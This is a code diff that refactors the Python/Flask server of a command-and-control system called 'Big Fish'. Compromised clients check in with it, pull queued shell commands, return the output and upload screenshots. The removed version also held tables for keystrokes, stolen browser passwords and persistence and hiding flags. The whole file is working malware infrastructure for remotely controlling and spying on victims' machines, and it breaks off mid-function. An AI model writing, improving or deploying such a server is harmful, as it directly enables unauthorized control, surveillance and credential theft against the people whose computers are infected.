@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 """
-Advanced C2 Server - Big Fish System
-Features: Client monitoring, file upload/download, keylogging, password extraction
+Stable Big Fish C2 Server - Fixed stability issues
 """
-from flask import Flask, request, jsonify, send_file, Response
+from flask import Flask, request, jsonify, send_file
 from flask_cors import CORS
 from flask_socketio import SocketIO, emit
 import time
@@ -17,34 +16,47 @@ import base64
 import json
 import logging
 from cryptography.fernet import Fernet
-import zipfile
-import io
+import atexit
+import signal
 
 # Configure logging
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
 logger = logging.getLogger(__name__)
 
 app = Flask(__name__)
 CORS(app, origins="*")
-socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')
+
+# Fix SocketIO configuration - use proper async mode
+try:
+    import eventlet
+    eventlet.monkey_patch()
+    socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet', ping_timeout=60, ping_interval=25)
+    logger.info("Using eventlet for SocketIO")
+except:
+    try:
+        import gevent
+        socketio = SocketIO(app, cors_allowed_origins="*", async_mode='gevent', ping_timeout=60, ping_interval=25)
+        logger.info("Using gevent for SocketIO")
+    except:
+        socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading', ping_timeout=60, ping_interval=25)
+        logger.info("Using threading for SocketIO")
 
 # Configuration
-DATABASE = 'bigfish.db'
-ONLINE_THRESHOLD = 300  # 5 minutes
-DOWNLOAD_FOLDER = 'downloads'
-UPLOAD_FOLDER = 'uploads'
-EXECUTABLES_FOLDER = 'executables'
-SCREENSHOTS_FOLDER = 'screenshots'
-KEYLOGS_FOLDER = 'keylogs'
-PASSWORDS_FOLDER = 'passwords'
+DATABASE = 'bigfish_stable.db'
+ONLINE_THRESHOLD = 120  # 2 minutes
+DOWNLOAD_FOLDER = 'downloads_stable'
+UPLOAD_FOLDER = 'uploads_stable'
+SCREENSHOTS_FOLDER = 'screenshots_stable'
 
 # Create folders
-for folder in [DOWNLOAD_FOLDER, UPLOAD_FOLDER, EXECUTABLES_FOLDER, 
-               SCREENSHOTS_FOLDER, KEYLOGS_FOLDER, PASSWORDS_FOLDER]:
+for folder in [DOWNLOAD_FOLDER, UPLOAD_FOLDER, SCREENSHOTS_FOLDER]:
     os.makedirs(folder, exist_ok=True)
 
 # Load or generate encryption key
-KEY_FILE = 'encryption.key'
+KEY_FILE = 'encryption_stable.key'
 if os.path.exists(KEY_FILE):
     with open(KEY_FILE, 'rb') as f:
         ENCRYPTION_KEY = f.read()
@@ -55,473 +67,252 @@ else:
 
 cipher = Fernet(ENCRYPTION_KEY)
 
+class ConnectionPool:
+    """Database connection pool for better performance"""
+    _connections = {}
+    
+    @classmethod
+    def get_connection(cls, db_path=DATABASE):
+        thread_id = threading.get_ident()
+        if thread_id not in cls._connections:
+            conn = sqlite3.connect(db_path, check_same_thread=False)
+            conn.row_factory = sqlite3.Row
+            cls._connections[thread_id] = conn
+        return cls._connections[thread_id]
+    
+    @classmethod
+    def close_all(cls):
+        for conn in cls._connections.values():
+            conn.close()
+        cls._connections.clear()
+
+atexit.register(ConnectionPool.close_all)
+
 def init_db():
-    """Initialize database with all tables"""
-    conn = sqlite3.connect(DATABASE)
+    """Initialize database with optimized tables"""
+    conn = ConnectionPool.get_connection()
     c = conn.cursor()
     
-    # Clients table
+    # Clients table with optimized indexes
     c.execute("""CREATE TABLE IF NOT EXISTS clients (
         id TEXT PRIMARY KEY,
         hostname TEXT,
         username TEXT,
         os TEXT,
-        os_version TEXT,
-        arch TEXT,
-        cpu TEXT,
-        ram TEXT,
-        gpu TEXT,
         ip TEXT,
         last_seen REAL,
-        status TEXT,
-        privileges TEXT,
-        av_status TEXT,
-        country TEXT,
-        city TEXT,
-        isp TEXT,
-        process_hidden INTEGER DEFAULT 0,
-        keylogger_active INTEGER DEFAULT 0,
-        persistence_set INTEGER DEFAULT 0,
+        status TEXT DEFAULT 'offline',
         created_at REAL,
-        download_folder TEXT,
-        online_hours REAL DEFAULT 0
+        online_hours REAL DEFAULT 0,
+        last_command_time REAL DEFAULT 0
     )""")
     
-    # Commands table
+    # Commands table with status tracking
     c.execute("""CREATE TABLE IF NOT EXISTS commands (
         id TEXT PRIMARY KEY,
         client_id TEXT,
         command TEXT,
-        command_type TEXT,
-        status TEXT,
+        command_type TEXT DEFAULT 'shell',
+        status TEXT DEFAULT 'pending',
         output TEXT,
         created_at REAL,
         executed_at REAL,
-        priority INTEGER DEFAULT 5,
-        require_admin INTEGER DEFAULT 0,
-        encrypted INTEGER DEFAULT 0,
+        retry_count INTEGER DEFAULT 0,
         FOREIGN KEY (client_id) REFERENCES clients(id)
     )""")
     
-    # Files table
-    c.execute("""CREATE TABLE IF NOT EXISTS files (
-        id TEXT PRIMARY KEY,
-        client_id TEXT,
-        filename TEXT,
-        original_name TEXT,
-        filepath TEXT,
-        filetype TEXT,
-        filesize INTEGER,
-        uploaded_at REAL,
-        downloaded INTEGER DEFAULT 0,
-        hash_md5 TEXT,
-        hash_sha256 TEXT,
-        encrypted INTEGER DEFAULT 0,
-        tags TEXT,
-        FOREIGN KEY (client_id) REFERENCES clients(id)
-    )""")
-    
-    # Executables table
-    c.execute("""CREATE TABLE IF NOT EXISTS executables (
-        id TEXT PRIMARY KEY,
-        name TEXT,
-        description TEXT,
-        filename TEXT,
-        filepath TEXT,
-        platform TEXT,
-        require_admin INTEGER DEFAULT 0,
-        uploader TEXT,
-        uploaded_at REAL,
-        downloads INTEGER DEFAULT 0,
-        hash_sha256 TEXT,
-        size INTEGER
-    )""")
-    
-    # Keylogs table
-    c.execute("""CREATE TABLE IF NOT EXISTS keylogs (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        client_id TEXT,
-        keystrokes TEXT,
-        window_title TEXT,
-        timestamp REAL,
-        process_name TEXT,
-        encrypted INTEGER DEFAULT 1,
-        FOREIGN KEY (client_id) REFERENCES clients(id)
-    )""")
-    
-    # Screenshots table
-    c.execute("""CREATE TABLE IF NOT EXISTS screenshots (
-        id TEXT PRIMARY KEY,
-        client_id TEXT,
-        timestamp REAL,
-        filepath TEXT,
-        thumbnail_path TEXT,
-        width INTEGER,
-        height INTEGER,
-        size INTEGER,
-        FOREIGN KEY (client_id) REFERENCES clients(id)
-    )""")
-    
-    # Passwords table
-    c.execute("""CREATE TABLE IF NOT EXISTS passwords (
-        id TEXT PRIMARY KEY,
-        client_id TEXT,
-        browser TEXT,
-        url TEXT,
-        username TEXT,
-        password TEXT,
-        encrypted_password TEXT,
-        timestamp REAL,
-        FOREIGN KEY (client_id) REFERENCES clients(id)
-    )""")
-    
-    # System info table
-    c.execute("""CREATE TABLE IF NOT EXISTS system_info (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        client_id TEXT,
-        info_type TEXT,
-        info_key TEXT,
-        info_value TEXT,
-        timestamp REAL,
-        FOREIGN KEY (client_id) REFERENCES clients(id)
-    )""")
-    
-    # Tasks table
-    c.execute("""CREATE TABLE IF NOT EXISTS tasks (
-        id TEXT PRIMARY KEY,
-        client_id TEXT,
-        task_type TEXT,
-        task_data TEXT,
-        status TEXT,
-        result TEXT,
-        created_at REAL,
-        completed_at REAL,
-        scheduled_for REAL,
-        priority INTEGER DEFAULT 5
-    )""")
-    
-    # Create indexes
+    # Create optimized indexes
+    c.execute("CREATE INDEX IF NOT EXISTS idx_clients_status ON clients(status)")
     c.execute("CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen)")
-    c.execute("CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id)")
     c.execute("CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status)")
-    c.execute("CREATE INDEX IF NOT EXISTS idx_files_client ON files(client_id)")
+    c.execute("CREATE INDEX IF NOT EXISTS idx_commands_client ON commands(client_id)")
     
     conn.commit()
-    conn.close()
     logger.info("[✓] Database initialized")
 
 init_db()
 
-def get_db():
-    conn = sqlite3.connect(DATABASE)
-    conn.row_factory = sqlite3.Row
-    return conn
+def get_client_info(client_id):
+    """Get client info with connection pool"""
+    conn = ConnectionPool.get_connection()
+    c = conn.cursor()
+    c.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
+    result = c.fetchone()
+    return dict(result) if result else None
 
-def encrypt_data(data):
-    """Encrypt sensitive data"""
-    if isinstance(data, str):
-        data = data.encode()
-    return base64.b64encode(cipher.encrypt(data)).decode()
+def update_client_last_seen(client_id):
+    """Update client last seen timestamp"""
+    conn = ConnectionPool.get_connection()
+    c = conn.cursor()
+    current_time = time.time()
+    
+    c.execute("""UPDATE clients SET 
+                last_seen = ?, 
+                status = CASE WHEN ? - last_seen > ? THEN 'offline' ELSE 'online' END
+                WHERE id = ?""",
+             (current_time, current_time, ONLINE_THRESHOLD, client_id))
+    
+    conn.commit()
+    return current_time
 
-def decrypt_data(encrypted_data):
-    """Decrypt data"""
-    try:
-        return cipher.decrypt(base64.b64decode(encrypted_data)).decode()
-    except:
-        return encrypted_data
-
-def get_client_folder(client_id, hostname):
-    """Get or create client-specific folder"""
-    safe_name = "".join(c for c in hostname if c.isalnum() or c in (' ', '-', '_')).strip()
-    if not safe_name:
-        safe_name = f"client_{client_id[:8]}"
-    
-    folders = {
-        'downloads': os.path.join(DOWNLOAD_FOLDER, safe_name),
-        'screenshots': os.path.join(SCREENSHOTS_FOLDER, safe_name),
-        'keylogs': os.path.join(KEYLOGS_FOLDER, safe_name),
-        'passwords': os.path.join(PASSWORDS_FOLDER, safe_name)
-    }
-    
-    for folder in folders.values():
-        os.makedirs(folder, exist_ok=True)
-    
-    return folders
-
-def format_size(size_bytes):
-    """Format file size"""
-    if size_bytes == 0:
-        return "0B"
-    
-    size_names = ["B", "KB", "MB", "GB", "TB"]
-    i = 0
-    while size_bytes >= 1024 and i < len(size_names) - 1:
-        size_bytes /= 1024
-        i += 1
-    
-    return f"{size_bytes:.2f} {size_names[i]}"
-
-# ==================== ROUTES ====================
+# ==================== FIXED ROUTES ====================
 
 @app.route('/')
 def index():
     return jsonify({
         'status': 'online',
-        'system': 'Big Fish C2',
-        'version': '4.0',
-        'clients': get_online_count()
+        'system': 'Big Fish C2 Stable',
+        'version': '4.1',
+        'timestamp': time.time()
     })
 
 @app.route('/api/health')
 def health():
-    return jsonify({'status': 'healthy'})
+    return jsonify({'status': 'healthy', 'timestamp': time.time()})
 
 @app.route('/api/checkin', methods=['POST'])
 def client_checkin():
-    """Client checkin endpoint"""
+    """Simplified and stable checkin endpoint"""
     try:
-        data = request.json
-        
-        if not data:
-            return jsonify({'error': 'No data'}), 400
-        
-        client_id = data.get('id')
-        if not client_id:
-            # Generate new client ID
-            client_id = str(uuid.uuid4())
-        
-        conn = get_db()
-        c = conn.cursor()
+        data = request.json or {}
         current_time = time.time()
         
-        # Get client IP
-        client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-        
-        # Prepare client data
+        # Generate or get client ID
+        client_id = data.get('id') or str(uuid.uuid4())
         hostname = data.get('hostname', 'Unknown')
-        client_folders = get_client_folder(client_id, hostname)
+        username = data.get('username', 'Unknown')
+        os_info = data.get('os', 'Unknown')
+        
+        # Get client IP
+        if request.headers.get('X-Forwarded-For'):
+            client_ip = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+        else:
+            client_ip = request.remote_addr
+        
+        conn = ConnectionPool.get_connection()
+        c = conn.cursor()
         
         # Check if client exists
-        c.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
-        existing_client = c.fetchone()
+        c.execute('SELECT id, status, online_hours FROM clients WHERE id = ?', (client_id,))
+        existing = c.fetchone()
         
-        if existing_client:
+        if existing:
             # Update existing client
-            online_hours = existing_client['online_hours']
-            if existing_client['status'] == 'offline':
-                online_hours += (current_time - existing_client['last_seen']) / 3600
+            online_hours = existing['online_hours']
+            if existing['status'] == 'offline':
+                online_hours += 0.1  # Add small increment
             
             c.execute("""UPDATE clients SET 
-                hostname=?, username=?, os=?, os_version=?, arch=?,
-                cpu=?, ram=?, gpu=?, ip=?, last_seen=?,
-                status='online', privileges=?, av_status=?,
-                country=?, city=?, isp=?, download_folder=?, online_hours=?
-                WHERE id=?""",
-                (data.get('hostname'), data.get('username'),
-                 data.get('os'), data.get('os_version'),
-                 data.get('arch'), data.get('cpu'),
-                 data.get('ram'), data.get('gpu'),
-                 client_ip, current_time,
-                 data.get('privileges'), data.get('av_status'),
-                 data.get('country'), data.get('city'),
-                 data.get('isp'), client_folders['downloads'],
-                 online_hours, client_id))
+                        hostname=?, username=?, os=?, ip=?, last_seen=?,
+                        status='online', online_hours=?
+                        WHERE id=?""",
+                     (hostname, username, os_info, client_ip, current_time, online_hours, client_id))
         else:
             # Insert new client
             c.execute("""INSERT INTO clients 
-                (id, hostname, username, os, os_version, arch, cpu, ram, gpu, ip, 
-                 last_seen, status, privileges, av_status, country, city, isp, 
-                 process_hidden, keylogger_active, persistence_set, created_at, 
-                 download_folder, online_hours) 
-                VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
-                (client_id, data.get('hostname'), data.get('username'),
-                 data.get('os'), data.get('os_version'), data.get('arch'),
-                 data.get('cpu'), data.get('ram'), data.get('gpu'),
-                 client_ip, current_time, 'online', data.get('privileges'),
-                 data.get('av_status'), data.get('country'),
-                 data.get('city'), data.get('isp'), 0, 0, 0,
-                 current_time, client_folders['downloads'], 0))
-        
-        # Store system info
-        if 'system_info' in data:
-            for key, value in data['system_info'].items():
-                c.execute("""INSERT INTO system_info (client_id, info_type, info_key, info_value, timestamp)
-                          VALUES (?, 'system', ?, ?, ?)""",
-                          (client_id, key, str(value), current_time))
+                        (id, hostname, username, os, ip, last_seen, status, created_at, online_hours)
+                        VALUES (?, ?, ?, ?, ?, ?, 'online', ?, 0.1)""",
+                     (client_id, hostname, username, os_info, client_ip, current_time, current_time))
         
         conn.commit()
-        
-        # Get updated client data
-        c.execute('SELECT * FROM clients WHERE id = ?', (client_id,))
-        client_data = dict(c.fetchone())
-        conn.close()
-        
-        # Notify via WebSocket
-        socketio.emit('client_update', {
-            'client_id': client_id,
-            'hostname': hostname,
-            'status': 'online',
-            'timestamp': current_time,
-            'data': client_data
-        })
         
         logger.info(f"[✓] Checkin: {hostname} ({client_ip})")
         
         return jsonify({
             'status': 'ok',
             'client_id': client_id,
-            'timestamp': current_time,
-            'server_time': datetime.now().isoformat(),
-            'message': 'Checkin successful'
+            'timestamp': current_time
         })
         
     except Exception as e:
-        logger.error(f"[✗] Checkin error: {e}")
-        return jsonify({'error': str(e)}), 500
+        logger.error(f"[✗] Checkin error: {str(e)[:100]}")
+        return jsonify({'status': 'error', 'message': str(e)[:100]}), 500
 
 @app.route('/api/clients', methods=['GET'])
 def get_all_clients():
-    """Get all clients with detailed info"""
+    """Get all clients - optimized"""
     try:
-        conn = get_db()
-        c = conn.cursor()
         current_time = time.time()
         
+        conn = ConnectionPool.get_connection()
+        c = conn.cursor()
+        
         # Update offline status
-        c.execute("UPDATE clients SET status='offline' WHERE ?-last_seen>?", 
+        c.execute("UPDATE clients SET status='offline' WHERE ? - last_seen > ?", 
                  (current_time, ONLINE_THRESHOLD))
         conn.commit()
         
-        # Get all clients with stats
-        c.execute("""SELECT 
-            c.*,
-            COUNT(DISTINCT f.id) as total_files,
-            COUNT(DISTINCT s.id) as total_screenshots,
-            COUNT(DISTINCT k.id) as total_keylogs,
-            COUNT(DISTINCT p.id) as total_passwords,
-            COALESCE(MAX(s.timestamp), 0) as last_screenshot,
-            COALESCE(MAX(k.timestamp), 0) as last_keylog
-            FROM clients c
-            LEFT JOIN files f ON c.id = f.client_id
-            LEFT JOIN screenshots s ON c.id = s.client_id
-            LEFT JOIN keylogs k ON c.id = k.client_id
-            LEFT JOIN passwords p ON c.id = p.client_id
-            GROUP BY c.id
-            ORDER BY c.last_seen DESC""")
+        # Get clients with simple query
+        c.execute("""SELECT id, hostname, username, os, ip, last_seen, status, 
+                    created_at, online_hours,
+                    (SELECT COUNT(*) FROM commands WHERE client_id = clients.id AND status = 'completed') as command_count
+                    FROM clients 
+                    ORDER BY last_seen DESC""")
         
         clients = []
         for row in c.fetchall():
-            time_diff = current_time - row['last_seen']
+            client = dict(row)
+            client['last_seen_str'] = datetime.fromtimestamp(client['last_seen']).strftime('%H:%M:%S')
+            client['created_str'] = datetime.fromtimestamp(client['created_at']).strftime('%Y-%m-%d')
             
-            # Determine status
-            if time_diff < 60:
-                status = 'online'
-                status_icon = '🟢'
-            elif time_diff < 300:
-                status = 'idle'
-                status_icon = '🟡'
+            # Calculate status with more tolerance
+            time_diff = current_time - client['last_seen']
+            if time_diff < 30:
+                client['status'] = 'online'
+                client['status_icon'] = '🟢'
+            elif time_diff < ONLINE_THRESHOLD:
+                client['status'] = 'idle'
+                client['status_icon'] = '🟡'
             else:
-                status = 'offline'
-                status_icon = '🔴'
+                client['status'] = 'offline'
+                client['status_icon'] = '🔴'
             
-            # Calculate uptime
-            uptime_str = ""
-            if row['online_hours'] > 0:
-                if row['online_hours'] < 1:
-                    uptime_str = f"{row['online_hours']*60:.0f}m"
-                elif row['online_hours'] < 24:
-                    uptime_str = f"{row['online_hours']:.1f}h"
-                else:
-                    uptime_str = f"{row['online_hours']/24:.1f}d"
-            
-            client_data = {
-                'id': row['id'],
-                'hostname': row['hostname'],
-                'username': row['username'],
-                'os': f"{row['os']} {row['os_version'] or ''}",
-                'arch': row['arch'],
-                'cpu': row['cpu'],
-                'ram': row['ram'],
-                'gpu': row['gpu'],
-                'ip': row['ip'],
-                'country': row['country'],
-                'city': row['city'],
-                'isp': row['isp'],
-                'privileges': row['privileges'],
-                'av_status': row['av_status'],
-                'status': status,
-                'status_icon': status_icon,
-                'process_hidden': bool(row['process_hidden']),
-                'keylogger_active': bool(row['keylogger_active']),
-                'persistence_set': bool(row['persistence_set']),
-                'last_seen': row['last_seen'],
-                'last_seen_str': datetime.fromtimestamp(row['last_seen']).strftime('%Y-%m-%d %H:%M:%S'),
-                'created_at': row['created_at'],
-                'created_str': datetime.fromtimestamp(row['created_at']).strftime('%Y-%m-%d'),
-                'online_hours': row['online_hours'],
-                'uptime_str': uptime_str,
-                'stats': {
-                    'files': row['total_files'],
-                    'screenshots': row['total_screenshots'],
-                    'keylogs': row['total_keylogs'],
-                    'passwords': row['total_passwords']
-                },
-                'last_activity': {
-                    'screenshot': row['last_screenshot'],
-                    'keylog': row['last_keylog']
-                }
-            }
-            clients.append(client_data)
+            clients.append(client)
         
-        conn.close()
         return jsonify({'clients': clients})
         
     except Exception as e:
         logger.error(f"[✗] Get clients error: {e}")
-        return jsonify({'clients': [], 'error': str(e)})
+        return jsonify({'clients': []})
 
 @app.route('/api/commands/<client_id>', methods=['GET'])
 def get_pending_commands(client_id):
-    """Get pending commands for client"""
+    """Get pending commands with timeout handling"""
     try:
-        conn = get_db()
+        current_time = update_client_last_seen(client_id)
+        
+        conn = ConnectionPool.get_connection()
         c = conn.cursor()
-        current_time = time.time()
         
-        # Update last seen
-        c.execute("UPDATE clients SET last_seen = ? WHERE id = ?", 
-                 (current_time, client_id))
-        
-        # Get pending commands
-        c.execute("""SELECT id, command, command_type, require_admin 
+        # Get pending commands (limit to 5 at a time)
+        c.execute("""SELECT id, command, command_type 
                     FROM commands 
                     WHERE client_id = ? AND status = 'pending'
-                    ORDER BY priority DESC, created_at ASC
-                    LIMIT 10""", (client_id,))
+                    ORDER BY created_at ASC 
+                    LIMIT 5""", (client_id,))
         
-        commands = [{'id': row['id'], 'command': row['command'],
-                    'type': row['command_type'], 
-                    'require_admin': bool(row['require_admin'])} 
-                   for row in c.fetchall()]
+        commands = []
+        command_ids = []
+        for row in c.fetchall():
+            commands.append({
+                'id': row['id'],
+                'command': row['command'],
+                'type': row['command_type']
+            })
+            command_ids.append(row['id'])
         
-        if commands:
-            # Mark as sent
-            cmd_ids = [cmd['id'] for cmd in commands]
-            placeholders = ','.join(['?'] * len(cmd_ids))
-            c.execute(f"UPDATE commands SET status = 'sent' WHERE id IN ({placeholders})", cmd_ids)
+        # Mark commands as sent
+        if command_ids:
+            placeholders = ','.join(['?'] * len(command_ids))
+            c.execute(f"""UPDATE commands SET status = 'sent' 
+                       WHERE id IN ({placeholders})""", command_ids)
+            conn.commit()
         
-        conn.commit()
-        
-        # Get updated client status
-        c.execute('SELECT status FROM clients WHERE id = ?', (client_id,))
-        status = c.fetchone()
-        conn.close()
-        
-        socketio.emit('client_heartbeat', {
+        # Emit heartbeat
+        socketio.emit('heartbeat', {
             'client_id': client_id,
-            'timestamp': current_time,
-            'status': 'online' if status else 'offline'
-        })
+            'timestamp': current_time
+        }, namespace='/')
         
         return jsonify({'commands': commands})
         
@@ -531,45 +322,46 @@ def get_pending_commands(client_id):
 
 @app.route('/api/command/result', methods=['POST'])
 def submit_command_result():
-    """Submit command execution result"""
+    """Submit command result with error handling"""
     try:
-        data = request.json
+        data = request.json or {}
         command_id = data.get('command_id')
         output = data.get('output', '')
         status = data.get('status', 'completed')
         
         if not command_id:
-            return jsonify({'error': 'Missing command ID'}), 400
+            return jsonify({'error': 'Missing command_id'}), 400
         
-        conn = get_db()
+        conn = ConnectionPool.get_connection()
         c = conn.cursor()
         
-        # Get command info
+        # Get command info first
         c.execute("SELECT client_id, command FROM commands WHERE id = ?", (command_id,))
         cmd_info = c.fetchone()
         
         if not cmd_info:
-            conn.close()
             return jsonify({'error': 'Command not found'}), 404
         
+        # Truncate output if too large
+        if len(output) > 10000:
+            output = output[:10000] + "\n...[truncated]"
+        
         # Update command
-        c.execute("""UPDATE commands 
-                    SET status = ?, output = ?, executed_at = ?
+        c.execute("""UPDATE commands SET 
+                    status = ?, output = ?, executed_at = ?
                     WHERE id = ?""",
-                 (status, output[:10000], time.time(), command_id))
+                 (status, output, time.time(), command_id))
         
         conn.commit()
-        conn.close()
         
-        # Notify via WebSocket
+        # Emit result
         socketio.emit('command_result', {
             'command_id': command_id,
             'client_id': cmd_info['client_id'],
             'command': cmd_info['command'],
-            'output': output[:500] + '...' if len(output) > 500 else output,
             'status': status,
             'timestamp': time.time()
-        })
+        }, namespace='/')
         
         logger.info(f"[✓] Command result: {command_id[:8]} - {status}")
         
@@ -577,74 +369,65 @@ def submit_command_result():
         
     except Exception as e:
         logger.error(f"[✗] Submit result error: {e}")
-        return jsonify({'error': str(e)}), 500
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/command', methods=['POST'])
 def send_command():
     """Send command to client"""
     try:
-        data = request.json
+        data = request.json or {}
         client_id = data.get('client_id')
-        command = data.get('command')
-        command_type = data.get('type', 'shell')
-        require_admin = data.get('require_admin', False)
-        priority = data.get('priority', 5)
+        command_text = data.get('command')
         
-        if not client_id or not command:
+        if not client_id or not command_text:
             return jsonify({'error': 'Missing parameters'}), 400
         
-        conn = get_db()
-        c = conn.cursor()
-        
         # Check if client exists
-        c.execute('SELECT id FROM clients WHERE id = ?', (client_id,))
-        if not c.fetchone():
-            conn.close()
+        client_info = get_client_info(client_id)
+        if not client_info:
             return jsonify({'error': 'Client not found'}), 404
         
         # Create command
         cmd_id = str(uuid.uuid4())
+        
+        conn = ConnectionPool.get_connection()
+        c = conn.cursor()
+        
         c.execute("""INSERT INTO commands 
-                    (id, client_id, command, command_type, status, 
-                     created_at, priority, require_admin)
-                    VALUES (?, ?, ?, ?, 'pending', ?, ?, ?)""",
-                 (cmd_id, client_id, command, command_type, 
-                  time.time(), priority, 1 if require_admin else 0))
+                    (id, client_id, command, created_at, status)
+                    VALUES (?, ?, ?, ?, 'pending')""",
+                 (cmd_id, client_id, command_text, time.time()))
         
         conn.commit()
-        conn.close()
         
-        # Notify via WebSocket
+        # Emit event
         socketio.emit('new_command', {
             'command_id': cmd_id,
             'client_id': client_id,
-            'command': command,
-            'type': command_type,
+            'command': command_text,
             'timestamp': time.time()
-        })
+        }, namespace='/')
         
-        logger.info(f"[✓] Command sent: {command_type} to {client_id[:8]}")
+        logger.info(f"[✓] Command sent to {client_id[:8]}")
         
         return jsonify({
             'success': True,
-            'command_id': cmd_id,
-            'message': 'Command queued'
+            'command_id': cmd_id
         })
         
     except Exception as e:
         logger.error(f"[✗] Send command error: {e}")
         return jsonify({'error': str(e)}), 500
 
-@app.route('/api/upload', methods=['POST'])
-def upload_file():
-    """Upload file from client"""
+@app.route('/api/screenshot', methods=['POST'])
+def upload_screenshot():
+    """Upload screenshot - fixed endpoint"""
     try:
         if 'file' not in request.files:
             return jsonify({'error': 'No file provided'}), 400
         
         file = request.files['file']
         client_id = request.form.get('client_id')
-        file_type = request.form.get('type', 'unknown')
         
         if not client_id:
             return jsonify({'error': 'No client ID'}), 400
@@ -652,185 +435,111 @@ def upload_file():
         if file.filename == '':
             return jsonify({'error': 'No filename'}), 400
         
-        conn = get_db()
-        c = conn.cursor()
-        
         # Get client info
-        c.execute('SELECT hostname, download_folder FROM clients WHERE id = ?', (client_id,))
-        client = c.fetchone()
-        
-        if not client:
-            conn.close()
+        client_info = get_client_info(client_id)
+        if not client_info:
             return jsonify({'error': 'Client not found'}), 404
         
-        # Determine file type and folder
-        filename = file.filename.lower()
-        if any(filename.endswith(ext) for ext in ['.exe', '.msi', '.bat', '.ps1', '.vbs']):
-            file_type = 'executable'
-            folder = EXECUTABLES_FOLDER
-        elif any(filename.endswith(ext) for ext in ['.jpg', '.jpeg', '.png', '.gif', '.bmp']):
-            file_type = 'image'
-            folder = SCREENSHOTS_FOLDER
-        elif any(filename.endswith(ext) for ext in ['.txt', '.log', '.cfg', '.ini']):
-            file_type = 'document'
-            folder = os.path.join(DOWNLOAD_FOLDER, client['hostname'], 'documents')
-        else:
-            file_type = 'other'
-            folder = os.path.join(DOWNLOAD_FOLDER, client['hostname'], 'other')
-        
-        os.makedirs(folder, exist_ok=True)
+        # Create client folder
+        client_folder = os.path.join(SCREENSHOTS_FOLDER, client_id)
+        os.makedirs(client_folder, exist_ok=True)
         
         # Save file
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
-        safe_filename = f"{timestamp}_{file.filename}"
-        filepath = os.path.join(folder, safe_filename)
+        filename = f"screenshot_{timestamp}.png"
+        filepath = os.path.join(client_folder, filename)
         
         file.save(filepath)
-        filesize = os.path.getsize(filepath)
         
-        # Calculate hashes
-        with open(filepath, 'rb') as f:
-            file_data = f.read()
-            hash_md5 = hashlib.md5(file_data).hexdigest()
-            hash_sha256 = hashlib.sha256(file_data).hexdigest()
-        
-        # Store in database
-        file_id = str(uuid.uuid4())
-        c.execute("""INSERT INTO files 
-                    (id, client_id, filename, original_name, filepath, 
-                     filetype, filesize, uploaded_at, hash_md5, hash_sha256)
-                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
-                 (file_id, client_id, safe_filename, file.filename,
-                  filepath, file_type, filesize, time.time(),
-                  hash_md5, hash_sha256))
-        
-        conn.commit()
-        conn.close()
-        
-        logger.info(f"[✓] File uploaded: {file.filename} ({filesize} bytes) from {client['hostname']}")
-        
-        socketio.emit('file_uploaded', {
-            'client_id': client_id,
-            'filename': file.filename,
-            'size': filesize,
-            'type': file_type,
-            'timestamp': time.time()
-        })
+        logger.info(f"[✓] Screenshot saved: {filename}")
         
         return jsonify({
             'success': True,
-            'file_id': file_id,
-            'filename': file.filename,
-            'size': filesize,
-            'hash_sha256': hash_sha256
+            'filename': filename
         })
         
     except Exception as e:
-        logger.error(f"[✗] Upload error: {e}")
+        logger.error(f"[✗] Screenshot upload error: {e}")
         return jsonify({'error': str(e)}), 500
 
 # ==================== WEB SOCKET EVENTS ====================
 
-@socketio.on('connect')
+@socketio.on('connect', namespace='/')
 def handle_connect():
-    logger.info(f"[✓] WebSocket client connected: {request.sid}")
-    emit('connected', {'message': 'Connected to C2 server', 'sid': request.sid})
+    logger.info(f"[✓] WebSocket connected: {request.sid}")
+    emit('connected', {'message': 'Connected to stable server', 'timestamp': time.time()})
 
-@socketio.on('disconnect')
+@socketio.on('disconnect', namespace='/')
 def handle_disconnect():
-    logger.info(f"[✓] WebSocket client disconnected: {request.sid}")
+    logger.info(f"[✓] WebSocket disconnected: {request.sid}")
 
-@socketio.on('client_update')
-def handle_client_update(data):
-    """Broadcast client updates to all connected consoles"""
-    emit('client_update', data, broadcast=True, include_self=False)
-
-@socketio.on('subscribe_client')
-def handle_subscribe_client(data):
-    """Subscribe to client updates"""
-    client_id = data.get('client_id')
-    logger.info(f"[✓] Subscribed to client: {client_id}")
-    emit('subscribed', {'client_id': client_id})
+@socketio.on('ping', namespace='/')
+def handle_ping(data):
+    emit('pong', {'timestamp': time.time()})
 
 # ==================== BACKGROUND TASKS ====================
 
-def cleanup_old_data():
-    """Clean up old data"""
+def cleanup_task():
+    """Background cleanup task"""
     while True:
         try:
-            conn = get_db()
-            c = conn.cursor()
             current_time = time.time()
+            conn = ConnectionPool.get_connection()
+            c = conn.cursor()
             
-            # Clean old completed commands (older than 7 days)
-            cutoff = current_time - (7 * 24 * 3600)
+            # Clean old completed commands (older than 1 day)
+            cutoff = current_time - (24 * 3600)
             c.execute("DELETE FROM commands WHERE executed_at < ? AND status = 'completed'", (cutoff,))
             
-            # Clean old keylogs (older than 30 days)
-            cutoff = current_time - (30 * 24 * 3600)
-            c.execute("DELETE FROM keylogs WHERE timestamp < ?", (cutoff,))
+            # Clean old sent commands that never got results (older than 1 hour)
+            cutoff = current_time - 3600
+            c.execute("""DELETE FROM commands WHERE status = 'sent' 
+                       AND created_at < ?""", (cutoff,))
             
             conn.commit()
-            conn.close()
             
-            logger.info("[✓] Cleanup completed")
+            # Emit stats update
+            c.execute("SELECT COUNT(*) FROM clients WHERE status = 'online'")
+            online_count = c.fetchone()[0]
